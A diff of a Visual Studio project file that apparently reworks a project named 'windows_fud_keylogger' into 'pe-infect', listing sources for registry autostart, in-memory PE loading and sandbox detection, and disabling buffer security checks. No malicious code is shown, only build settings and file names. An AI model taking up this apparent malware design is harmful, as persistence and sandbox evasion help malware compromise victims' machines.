@@ -12,24 +12,24 @@
   </ItemGroup>
   <PropertyGroup Label="Globals">
     <VCProjectVersion>16.0</VCProjectVersion>
-    <ProjectGuid>{427f8881-deca-411e-bcf6-077a3b6359b5}</ProjectGuid>
-    <RootNamespace>windows_fud_keylogger</RootNamespace>
+    <ProjectGuid>{76275332-9ea4-44ab-a9f3-42d9b83f5316}</ProjectGuid>
+    <RootNamespace>pe-infect</RootNamespace>
     <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+    <ProjectName>pe-infect</ProjectName>
   </PropertyGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
     <ConfigurationType>Application</ConfigurationType>
     <UseDebugLibraries>true</UseDebugLibraries>
     <PlatformToolset>v142</PlatformToolset>
-    <CharacterSet>MultiByte</CharacterSet>
+    <CharacterSet>Unicode</CharacterSet>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
     <ConfigurationType>Application</ConfigurationType>
     <UseDebugLibraries>false</UseDebugLibraries>
     <PlatformToolset>v142</PlatformToolset>
     <WholeProgramOptimization>true</WholeProgramOptimization>
-    <CharacterSet>MultiByte</CharacterSet>
-    <UseOfMfc>false</UseOfMfc>
+    <CharacterSet>Unicode</CharacterSet>
   </PropertyGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
   <ImportGroup Label="ExtensionSettings">
@@ -63,7 +63,6 @@
       <AdditionalIncludeDirectories>$(ProjectDir);%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
       <PrecompiledHeader>Use</PrecompiledHeader>
       <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
-      <BufferSecurityCheck>false</BufferSecurityCheck>
       <AdditionalOptions>/FS %(AdditionalOptions)</AdditionalOptions>
     </ClCompile>
     <Link>
@@ -73,7 +72,7 @@
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
     <ClCompile>
       <WarningLevel>Level3</WarningLevel>
-      <Optimization>MinSpace</Optimization>
+      <Optimization>MaxSpeed</Optimization>
       <FunctionLevelLinking>true</FunctionLevelLinking>
       <IntrinsicFunctions>true</IntrinsicFunctions>
       <SDLCheck>true</SDLCheck>
@@ -83,25 +82,13 @@
       <PrecompiledHeader>Use</PrecompiledHeader>
       <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
       <InlineFunctionExpansion>AnySuitable</InlineFunctionExpansion>
-      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
+      <FavorSizeOrSpeed>Speed</FavorSizeOrSpeed>
       <OmitFramePointers>true</OmitFramePointers>
       <EnableFiberSafeOptimizations>true</EnableFiberSafeOptimizations>
-      <RuntimeTypeInfo>false</RuntimeTypeInfo>
-      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
-      <OpenMPSupport>
-      </OpenMPSupport>
-      <BufferSecurityCheck>false</BufferSecurityCheck>
-      <FloatingPointModel>Fast</FloatingPointModel>
-      <OmitDefaultLibName>false</OmitDefaultLibName>
-      <AssemblerOutput>
-      </AssemblerOutput>
-      <MultiProcessorCompilation>false</MultiProcessorCompilation>
-      <ControlFlowGuard>false</ControlFlowGuard>
-      <CreateHotpatchableImage>true</CreateHotpatchableImage>
-      <CallingConvention>FastCall</CallingConvention>
-      <UseUnicodeForAssemblerListing>
-      </UseUnicodeForAssemblerListing>
       <AdditionalOptions>/FS %(AdditionalOptions)</AdditionalOptions>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <BufferSecurityCheck>false</BufferSecurityCheck>
+      <RuntimeTypeInfo>false</RuntimeTypeInfo>
     </ClCompile>
     <Link>
       <SubSystem>Console</SubSystem>
@@ -110,27 +97,24 @@
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
-    <ClCompile Include="infect_system\make_autostart\autostart.cpp" />
-    <ClCompile Include="keyscan\get6bitkeycode.cpp" />
-    <ClCompile Include="keyscan\keyscan.cpp" />
-    <ClCompile Include="log\logFILE\file.cpp" />
-    <ClCompile Include="log\log.cpp" />
+    <ClCompile Include="autostart\addtoreg.cpp" />
+    <ClCompile Include="autostart\writereg.cpp" />
+    <ClCompile Include="example\example.cpp" />
+    <ClCompile Include="load_pe_mem\loadpe.cpp" />
+    <ClCompile Include="main.cpp" />
     <ClCompile Include="pch.cpp">
       <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
       <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
     </ClCompile>
-    <ClCompile Include="main.cpp" />
+    <ClCompile Include="sandboxdetect\sandboxdetect.cpp" />
   </ItemGroup>
   <ItemGroup>
-    <ClInclude Include="infect_system\make_autostart\autostart.h" />
-    <ClInclude Include="keyscan\keyscan.h" />
-    <ClInclude Include="log\log.h" />
-    <ClInclude Include="log\logFILE\file.h" />
-    <ClInclude Include="pch.h" />
+    <ClInclude Include="autostart\autostart.h" />
+    <ClInclude Include="example\example.h" />
     <ClInclude Include="settings.h" />
-  </ItemGroup>
-  <ItemGroup>
-    <Text Include="infect_system\make_autostart\research.txt" />
+    <ClInclude Include="load_pe_mem\loadpe.h" />
+    <ClInclude Include="pch.h" />
+    <ClInclude Include="sandboxdetect\sandboxdetect.h" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
